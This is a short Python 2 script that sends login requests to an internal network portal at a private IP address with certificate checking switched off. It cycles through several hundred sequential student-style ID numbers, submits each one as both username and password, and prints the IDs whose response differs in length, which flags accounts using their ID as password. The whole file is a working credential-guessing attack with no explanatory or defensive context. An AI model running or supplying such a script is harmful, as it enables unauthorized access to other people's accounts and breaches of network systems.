from urllib import urlencode
from urllib2 import urlopen
import urllib2
from bs4 import BeautifulSoup
import ssl
url = "https://10.100.56.55:8090/httpclient.html"
context = ssl._create_unverified_context()
id = 201601000
#pwd = ""
for num in range(1,500):
    id+=1
    mode = "191"
    params = urlencode({'mode' : mode , 'username' : id , 'password' : id})
    res = urllib2.urlopen(url,params,context=context)
    bs = BeautifulSoup(res,"html.parser")
    data = bs.message
    str_size = len(data.text)
    if str_size != 67:
        print id
